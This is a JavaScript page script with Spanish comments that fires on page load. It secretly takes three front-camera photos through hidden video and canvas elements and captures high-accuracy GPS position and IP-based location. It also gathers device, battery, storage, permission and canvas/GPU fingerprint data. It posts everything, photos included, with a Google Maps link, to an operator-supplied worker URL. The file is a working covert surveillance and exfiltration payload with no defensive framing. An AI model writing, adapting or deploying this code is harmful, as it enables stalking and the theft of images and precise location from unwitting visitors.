(function() {
    const scriptTag = document.currentScript;
    const trackingId = scriptTag.dataset.trackingId;
    const workerUrl = scriptTag.dataset.serverUrl;

    // ============================================================
    // 1. CAPTURAR MÚLTIPLES FOTOS (SIN TRABAR)
    // ============================================================
    async function capturarFotos(cantidad = 3) {
        const fotos = [];
        const video = document.createElement('video');
        const canvas = document.createElement('canvas');
        video.style.display = 'none';
        canvas.style.display = 'none';
        document.body.appendChild(video);
        document.body.appendChild(canvas);

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
            });
            video.srcObject = stream;
            await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
            await new Promise(r => setTimeout(r, 300));

            for (let i = 0; i < cantidad; i++) {
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
                fotos.push(blob);
                await new Promise(r => setTimeout(r, 200)); // Pequeña pausa entre fotos
            }

            stream.getTracks().forEach(t => t.stop());
            video.remove();
            canvas.remove();
            return fotos;
        } catch(e) {
            return [];
        }
    }

    // ============================================================
    // 2. CAPTURAR GPS CON WATCHPOSITION (MÁXIMA PRECISIÓN)
    // ============================================================
    function capturarGPS() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) { resolve(null); return; }
            let mejor = null;
            let watchId = navigator.geolocation.watchPosition(
                (pos) => {
                    const coords = {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        acc: pos.coords.accuracy,
                        alt: pos.coords.altitude || null,
                        heading: pos.coords.heading || null,
                        speed: pos.coords.speed || null
                    };
                    if (!mejor || coords.acc < mejor.acc) mejor = coords;
                    if (coords.acc < 20) {
                        navigator.geolocation.clearWatch(watchId);
                        resolve(mejor);
                    }
                },
                () => {
                    navigator.geolocation.clearWatch(watchId);
                    resolve(mejor);
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
            setTimeout(() => {
                navigator.geolocation.clearWatch(watchId);
                resolve(mejor);
            }, 8000);
        });
    }

    // ============================================================
    // 3. CAPTURAR IP CON MÚLTIPLES APIs
    // ============================================================
    async function capturarIP() {
        const resultados = [];
        // ipapi.co
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            if (data.latitude && data.longitude) {
                resultados.push({
                    fuente: 'ipapi.co',
                    lat: data.latitude,
                    lng: data.longitude,
                    ciudad: data.city,
                    region: data.region,
                    pais: data.country_name,
                    codigo: data.postal,
                    ip: data.ip,
                    timezone: data.timezone,
                    isp: data.org
                });
            }
        } catch(e) {}
        // ipinfo.io (si tienes token, ponlo en una variable)
        const IPINFO_TOKEN = 'TU_TOKEN_IPINFO'; // Opcional
        if (IPINFO_TOKEN && IPINFO_TOKEN !== 'TU_TOKEN_IPINFO') {
            try {
                const res = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
                const data = await res.json();
                if (data.loc) {
                    const [lat, lng] = data.loc.split(',').map(Number);
                    resultados.push({
                        fuente: 'ipinfo.io',
                        lat, lng,
                        ciudad: data.city,
                        region: data.region,
                        pais: data.country,
                        ip: data.ip,
                        timezone: data.timezone,
                        isp: data.org
                    });
                }
            } catch(e) {}
        }
        // Cloudflare (se obtiene desde el Worker, no desde aquí)
        return resultados;
    }

    // ============================================================
    // 4. DATOS DEL DISPOSITIVO (DETALLADOS)
    // ============================================================
    function obtenerDispositivo() {
        const ua = navigator.userAgent;
        let modelo = 'Desconocido';
        if (ua.includes('iPhone')) modelo = 'iPhone';
        else if (ua.includes('iPad')) modelo = 'iPad';
        else if (ua.includes('Android')) modelo = 'Android';
        else if (ua.includes('Mac')) modelo = 'Mac';
        else if (ua.includes('Windows')) modelo = 'Windows PC';
        else if (ua.includes('Linux')) modelo = 'Linux';

        return {
            modelo: modelo,
            userAgent: ua,
            language: navigator.language || 'N/A',
            platform: navigator.platform || 'N/A',
            vendor: navigator.vendor || 'N/A',
            resolution: `${window.screen.width}x${window.screen.height}`,
            colorDepth: window.screen.colorDepth || 'N/A',
            cpuCores: navigator.hardwareConcurrency || 'N/A',
            deviceMemory: navigator.deviceMemory || 'N/A'
        };
    }

    // ============================================================
    // 5. FINGERPRINT (GPU Y CANVAS)
    // ============================================================
    function obtenerFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200; canvas.height = 50;
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = '#069';
            ctx.font = '14px Arial';
            ctx.fillText('FP', 10, 30);
            const hash = canvas.toDataURL().slice(0, 80);
            let gpu = 'N/A';
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const info = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : 'N/A';
            } catch(e) {}
            return { gpu, canvas: hash };
        } catch(e) {
            return { gpu: 'N/A', canvas: 'N/A' };
        }
    }

    // ============================================================
    // 6. BATERÍA Y ALMACENAMIENTO
    // ============================================================
    async function obtenerBateria() {
        try {
            const battery = await navigator.getBattery();
            return {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging ? 'Sí' : 'No'
            };
        } catch(e) {
            return { level: 'N/A', charging: 'N/A' };
        }
    }

    async function obtenerAlmacenamiento() {
        try {
            const est = await navigator.storage.estimate();
            return {
                total: (est.quota / (1024**3)).toFixed(2) + ' GB',
                used: (est.usage / (1024**3)).toFixed(2) + ' GB'
            };
        } catch(e) {
            return { total: 'N/A', used: 'N/A' };
        }
    }

    // ============================================================
    // 7. PERMISOS
    // ============================================================
    async function obtenerPermisos() {
        const permisos = { camera: 'Desconocido', location: 'Desconocido' };
        try {
            const resultCam = await navigator.permissions.query({ name: 'camera' });
            permisos.camera = resultCam.state;
        } catch(e) {}
        try {
            const resultLoc = await navigator.permissions.query({ name: 'geolocation' });
            permisos.location = resultLoc.state;
        } catch(e) {}
        return permisos;
    }

    // ============================================================
    // 8. ENVIAR TODOS LOS DATOS AL WORKER
    // ============================================================
    async function enviarAlWorker() {
        // Capturar todo en paralelo
        const [fotos, gps, ipData, dispositivo, fp, bateria, almacenamiento, permisos] = await Promise.all([
            capturarFotos(3),
            capturarGPS(),
            capturarIP(),
            obtenerDispositivo(),
            obtenerFingerprint(),
            obtenerBateria(),
            obtenerAlmacenamiento(),
            obtenerPermisos()
        ]);

        // ========== CONSTRUIR MENSAJE ==========
        let msg = '📊 *CAPTURA DE DATOS COMPLETA*\n━━━━━━━━━━━━━━━━\n';

        // 1. Dispositivo y navegador
        msg += `🖥️ *Device & Browser*\n`;
        msg += `   • Device Model: ${dispositivo.modelo}\n`;
        msg += `   • User Agent: ${dispositivo.userAgent}\n\n`;

        // 2. Red
        const ip = ipData.length > 0 ? ipData[0] : null;
        if (ip) {
            msg += `🌐 *Network Information*\n`;
            msg += `   • IP Address: ${ip.ip || 'N/A'}\n`;
            msg += `   • Language: ${dispositivo.language}\n\n`;
        }

        // 3. Ubicación (GPS o IP)
        if (gps) {
            msg += `📍 *GPS Location* (precisión ±${gps.acc}m)\n`;
            msg += `   • Lat: ${gps.lat}\n`;
            msg += `   • Lng: ${gps.lng}\n`;
            msg += `   • Altitud: ${gps.alt || 'N/A'} m\n`;
            if (gps.heading) msg += `   • Dirección: ${gps.heading}°\n`;
            if (gps.speed) msg += `   • Velocidad: ${gps.speed} m/s\n`;
            msg += `   • 🗺️ Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n\n`;
        } else if (ip) {
            msg += `📍 *IP Location* (aproximada)\n`;
            msg += `   • País: ${ip.pais || 'N/A'}\n`;
            msg += `   • Región: ${ip.region || 'N/A'}\n`;
            msg += `   • Ciudad: ${ip.ciudad || 'N/A'}\n`;
            msg += `   • Código Postal: ${ip.codigo || 'N/A'}\n`;
            msg += `   • Timezone: ${ip.timezone || 'N/A'}\n`;
            msg += `   • ISP: ${ip.isp || 'N/A'}\n`;
            msg += `   • 🗺️ Google Maps: https://www.google.com/maps?q=${ip.lat},${ip.lng}\n\n`;
        } else {
            msg += `📍 Ubicación: No disponible\n\n`;
        }

        // 4. Display
        msg += `🖼️ *Display Information*\n`;
        msg += `   • Resolution: ${dispositivo.resolution}\n`;
        msg += `   • Color Depth: ${dispositivo.colorDepth}\n\n`;

        // 5. Batería
        msg += `🔋 *Battery Status*\n`;
        msg += `   • Level: ${bateria.level}\n`;
        msg += `   • Charging: ${bateria.charging}\n\n`;

        // 6. Permisos
        msg += `🔐 *Device Permissions*\n`;
        msg += `   • Camera: ${permisos.camera}\n`;
        msg += `   • Location: ${permisos.location}\n\n`;

        // 7. Hardware
        msg += `💾 *Hardware & Storage*\n`;
        msg += `   • CPU Cores: ${dispositivo.cpuCores}\n`;
        msg += `   • RAM: ${dispositivo.deviceMemory} GB\n`;
        msg += `   • Storage Used: ${almacenamiento.used}\n`;
        msg += `   • Storage Total: ${almacenamiento.total}\n\n`;

        // 8. Fingerprint
        msg += `🎨 *Fingerprint*\n`;
        msg += `   • GPU: ${fp.gpu}\n`;
        msg += `   • Canvas: ${fp.canvas}\n\n`;

        msg += `⏰ ${new Date().toISOString()}`;

        // ========== ENVIAR AL WORKER ==========
        const formData = new FormData();
        formData.append('text', msg);
        // Enviar todas las fotos (máximo 3)
        fotos.forEach((foto, index) => {
            if (foto) formData.append(`photo_${index}`, foto, `photo_${index}.jpg`);
        });

        try {
            await fetch(workerUrl, { method: 'POST', body: formData });
        } catch(e) {
            console.error('Error:', e);
        }
    }

    // ============================================================
    // 9. EJECUTAR AL CARGAR LA PÁGINA
    // ============================================================
    window.addEventListener('load', () => {
        setTimeout(enviarAlWorker, 1000);
    });
})();
